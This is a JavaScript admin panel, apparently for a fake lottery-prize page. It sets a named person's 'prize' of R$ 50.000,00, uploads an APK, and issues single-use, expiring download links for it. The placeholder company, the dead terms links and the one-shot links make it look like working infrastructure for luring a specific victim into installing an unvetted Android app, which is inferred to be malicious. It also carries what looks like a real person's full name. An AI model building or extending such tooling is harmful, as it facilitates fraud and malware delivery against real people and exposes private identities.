const WORKER_BASE='https://download.centraldepremios.online';
const API_URL=WORKER_BASE+'/config';
const APK_URL=WORKER_BASE+'/apk';
const APK_UPLOAD_URL=WORKER_BASE+'/admin/apk/upload';
const APK_DELETE_URL=WORKER_BASE+'/admin/apk/delete';
const APK_STATUS_URL=WORKER_BASE+'/apk/status';
const APK_LINK_CREATE_URL=WORKER_BASE+'/admin/apk/link';
const STORAGE_KEY='campanha-premiada-settings';
const TOKEN_KEY='central-premios-admin-token';

const defaults={
  customerName:'VERA LÚCIA APARECIDA GNANI',
  campaignName:'Familhão da Lotérica',
  message:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  prizeValue:'R$ 50.000,00',
  paymentMethod:'acesso',
  paymentCode:'',
  redemptionText:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  companyName:'Empresa responsável',
  regulationUrl:'#',
  termsUrl:'#'
};

const ids={
  customerName:'nameInput',
  prizeValue:'valueInput',
  campaignName:'campaignInput',
  message:'messageInput',
  paymentMethod:'paymentMethodInput',
  paymentCode:'paymentCodeInput',
  redemptionText:'redemptionTextInput',
  companyName:'companyInput',
  regulationUrl:'regulationInput',
  termsUrl:'termsInput'
};

function toast(msg,duration=2200){
  const t=document.createElement('div');
  t.className='toast';
  t.textContent=msg;
  document.body.appendChild(t);
  setTimeout(()=>t.remove(),duration);
}

function fillForm(data){
  const s={...defaults,...data};
  if(s.paymentMethod==='pix' || s.paymentMethod==='credito') s.paymentMethod='acesso';
  Object.entries(ids).forEach(([key,id])=>{
    const el=document.getElementById(id);
    if(el) el.value=s[key]??'';
  });
}

function collectForm(){
  const data={};
  Object.entries(ids).forEach(([key,id])=>{
    const el=document.getElementById(id);
    data[key]=(el?.value??'').trim();
  });
  return data;
}

function formatBytes(bytes){
  if(!Number.isFinite(bytes) || bytes<0) return '—';
  if(bytes===0) return '0 B';
  const units=['B','KB','MB','GB'];
  const i=Math.min(Math.floor(Math.log(bytes)/Math.log(1024)),units.length-1);
  const value=bytes/Math.pow(1024,i);
  return value.toLocaleString('pt-BR',{maximumFractionDigits:i===0?0:1})+' '+units[i];
}

function getAdminToken(){
  let token=sessionStorage.getItem(TOKEN_KEY)||'';
  if(!token){
    token=prompt('Digite o ADMIN_TOKEN configurado no Cloudflare:')||'';
    token=token.trim();
    if(token) sessionStorage.setItem(TOKEN_KEY,token);
  }
  return token;
}

function authHeaders(extra={}){
  const token=getAdminToken();
  if(!token) throw new Error('TOKEN_REQUIRED');
  return {...extra,'Authorization':'Bearer '+token};
}

function handleUnauthorized(response){
  if(response.status===401){
    sessionStorage.removeItem(TOKEN_KEY);
    throw new Error('UNAUTHORIZED');
  }
}

async function loadGlobalConfig(){
  try{
    const response=await fetch(API_URL+'?t='+Date.now(),{
      method:'GET',
      cache:'no-store',
      headers:{'Accept':'application/json'}
    });
    if(!response.ok) throw new Error('HTTP '+response.status);
    const data=await response.json();
    fillForm(data);
    try{localStorage.setItem(STORAGE_KEY,JSON.stringify(data))}catch{}
  }catch(error){
    console.error(error);
    try{
      const saved=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');
      fillForm(saved);
      toast('Endpoint global indisponível. Exibindo cópia local.',3500);
    }catch{
      fillForm(defaults);
    }
  }
}

function saveLocalConfig(data){
  localStorage.setItem(STORAGE_KEY,JSON.stringify(data));
  return data;
}

async function mirrorRemoteConfig(data){
  const token=getAdminToken();
  if(!token) throw new Error('TOKEN_REQUIRED');

  const response=await fetch(API_URL,{
    method:'POST',
    headers:{
      'Content-Type':'application/json',
      'Authorization':'Bearer '+token
    },
    body:JSON.stringify(data)
  });

  if(response.status===401){
    sessionStorage.removeItem(TOKEN_KEY);
    throw new Error('UNAUTHORIZED');
  }

  if(!response.ok){
    const detail=await response.text().catch(()=> '');
    throw new Error('HTTP '+response.status+' '+detail);
  }

  return response.json().catch(()=>({ok:true}));
}

async function loadApkStatus(){
  const badge=document.getElementById('apkStatusBadge');
  const name=document.getElementById('apkCurrentName');
  const meta=document.getElementById('apkCurrentMeta');
  const deleteButton=document.getElementById('apkDeleteButton');

  if(badge){
    badge.textContent='Status desativado';
    badge.className='apk-status-badge';
  }

  if(name){
    name.textContent='Consulta de status desativada no Worker';
  }

  if(meta){
    meta.textContent='Você ainda pode enviar, substituir ou excluir o APK normalmente.';
  }

  if(deleteButton){
    deleteButton.disabled=false;
  }
}

function setApkBusy(busy,text='Enviando...'){
  const upload=document.getElementById('apkUploadButton');
  const del=document.getElementById('apkDeleteButton');
  const input=document.getElementById('apkFileInput');
  const wrap=document.getElementById('apkProgressWrap');
  const bar=document.getElementById('apkProgressBar');
  const progressText=document.getElementById('apkProgressText');

  upload.disabled=busy;
  del.disabled=busy;
  input.disabled=busy;
  wrap.hidden=!busy;
  progressText.textContent=text;
  bar.style.width=busy?'100%':'0%';
}

async function uploadApk(){
  const input=document.getElementById('apkFileInput');
  const file=input.files?.[0];

  if(!file){
    toast('Selecione um arquivo APK primeiro.');
    return;
  }

  if(!file.name.toLowerCase().endsWith('.apk')){
    toast('Selecione somente um arquivo .apk.');
    return;
  }

  const token=getAdminToken();
  if(!token){
    toast('Envio cancelado: token não informado.');
    return;
  }

  setApkBusy(true,'Enviando '+file.name+'...');

  try{
    const form=new FormData();
    form.append('token',token);
    form.append('file',file,file.name);

    const response=await fetch(APK_UPLOAD_URL,{
      method:'POST',
      body:form
    });

    if(response.status===401){
      sessionStorage.removeItem(TOKEN_KEY);
      throw new Error('UNAUTHORIZED');
    }

    if(!response.ok){
      const text=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+text);
    }

    const data=await response.json().catch(()=>({}));

    input.value='';
    document.getElementById('apkSelectedInfo').textContent='Nenhum arquivo selecionado.';
    toast(data.message||'APK enviado/substituído com sucesso.');
    await loadApkStatus();
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else {
      const detail=(error?.message||'Erro desconhecido').replace(/^HTTP\s*/,'');
      toast('Erro ao enviar APK: '+detail,6000);
    }
  }finally{
    setApkBusy(false);
    await loadApkStatus();
  }
}

async function generateApkLink(){
  const token=getAdminToken();
  if(!token){
    toast('Geração cancelada: token não informado.');
    return;
  }

  const button=document.getElementById('apkGenerateLinkButton');
  const output=document.getElementById('apkGeneratedLink');
  const expires=document.getElementById('apkGeneratedMeta');

  if(button) button.disabled=true;

  try{
    const response=await fetch(APK_LINK_CREATE_URL,{
      method:'POST',
      cache:'no-store',
      headers:{
        'Accept':'application/json',
        'Authorization':'Bearer '+token
      }
    });

    if(response.status===401){
      sessionStorage.removeItem(TOKEN_KEY);
      throw new Error('UNAUTHORIZED');
    }

    if(!response.ok){
      const detail=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+detail);
    }

    const data=await response.json();

    if(!data.url) throw new Error('LINK_MISSING');

    if(output) output.value=data.url;
    if(expires){
      const seconds=Number(data.expiresIn||300);
      expires.textContent='Link de uso único. Expira em '+Math.ceil(seconds/60)+' minuto(s) ou após o primeiro uso.';
    }

    toast('Link único gerado com sucesso.');
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED'){
      toast('ADMIN_TOKEN incorreto. Tente novamente.',4500);
    }else{
      toast('Erro ao gerar link: '+(error?.message||'falha desconhecida'),6000);
    }
  }finally{
    if(button) button.disabled=false;
  }
}

async function copyGeneratedApkLink(){
  const output=document.getElementById('apkGeneratedLink');
  const value=(output?.value||'').trim();

  if(!value){
    toast('Gere um link primeiro.');
    return;
  }

  try{
    await navigator.clipboard.writeText(value);
  }catch{
    output.select();
    document.execCommand('copy');
  }

  toast('Link copiado.');
}

async function deleteApk(){
  if(!confirm('Tem certeza que deseja excluir o APK atual? O botão de download ficará indisponível até um novo APK ser enviado.')) return;

  const token=getAdminToken();
  if(!token){
    toast('Exclusão cancelada: token não informado.');
    return;
  }

  setApkBusy(true,'Excluindo APK...');

  try{
    const form=new FormData();
    form.append('token',token);

    const response=await fetch(APK_DELETE_URL,{
      method:'POST',
      body:form
    });

    if(response.status===401){
      sessionStorage.removeItem(TOKEN_KEY);
      throw new Error('UNAUTHORIZED');
    }

    if(!response.ok){
      const text=await response.text().catch(()=> '');
      throw new Error('HTTP '+response.status+' '+text);
    }

    const data=await response.json().catch(()=>({}));
    toast(data.message||'APK excluído com sucesso.');
  }catch(error){
    console.error(error);
    if(error.message==='UNAUTHORIZED') toast('Token incorreto. Tente novamente.');
    else {
      const detail=(error?.message||'Erro desconhecido').replace(/^HTTP\s*/,'');
      toast('Erro ao excluir APK: '+detail,6000);
    }
  }finally{
    setApkBusy(false);
    await loadApkStatus();
  }
}

document.getElementById('settingsForm')?.addEventListener('submit',async e=>{
  e.preventDefault();
  const button=e.submitter || document.querySelector('.save-button');
  if(button) button.disabled=true;

  const data=collectForm();

  try{
    saveLocalConfig(data);
  }catch(error){
    console.error(error);
    toast('Não foi possível salvar neste navegador.',3500);
    if(button) button.disabled=false;
    return;
  }

  try{
    await mirrorRemoteConfig(data);
    toast('Alterações salvas e publicadas no site.');
  }catch(error){
    console.error(error);
    if(error.message==='TOKEN_REQUIRED'){
      toast('Salvo localmente. Para publicar globalmente, informe o ADMIN_TOKEN.',4500);
    }else if(error.message==='UNAUTHORIZED'){
      toast('Salvo localmente. ADMIN_TOKEN incorreto para publicação global.',5000);
    }else{
      toast('Salvo localmente, mas o endpoint global está indisponível.',5000);
    }
  }finally{
    if(button) button.disabled=false;
  }
});

document.getElementById('restoreButton')?.addEventListener('click',async()=>{
  if(!confirm('Restaurar os valores padrão?')) return;

  try{
    saveLocalConfig(defaults);
    fillForm(defaults);
  }catch(error){
    console.error(error);
    toast('Não foi possível restaurar neste navegador.',3500);
    return;
  }

  try{
    await mirrorRemoteConfig(defaults);
    toast('Padrão restaurado e publicado no site.');
  }catch(error){
    console.error(error);
    toast('Padrão restaurado localmente, mas o endpoint global está indisponível.',5000);
  }
});

document.getElementById('apkFileInput')?.addEventListener('change',event=>{
  const file=event.target.files?.[0];
  document.getElementById('apkSelectedInfo').textContent=file
    ? file.name+' • '+formatBytes(file.size)
    : 'Nenhum arquivo selecionado.';
});

document.getElementById('apkUploadButton')?.addEventListener('click',uploadApk);
document.getElementById('apkDeleteButton')?.addEventListener('click',deleteApk);
document.getElementById('apkGenerateLinkButton')?.addEventListener('click',generateApkLink);
document.getElementById('apkCopyGeneratedLink')?.addEventListener('click',copyGeneratedApkLink);

loadGlobalConfig();
loadApkStatus();
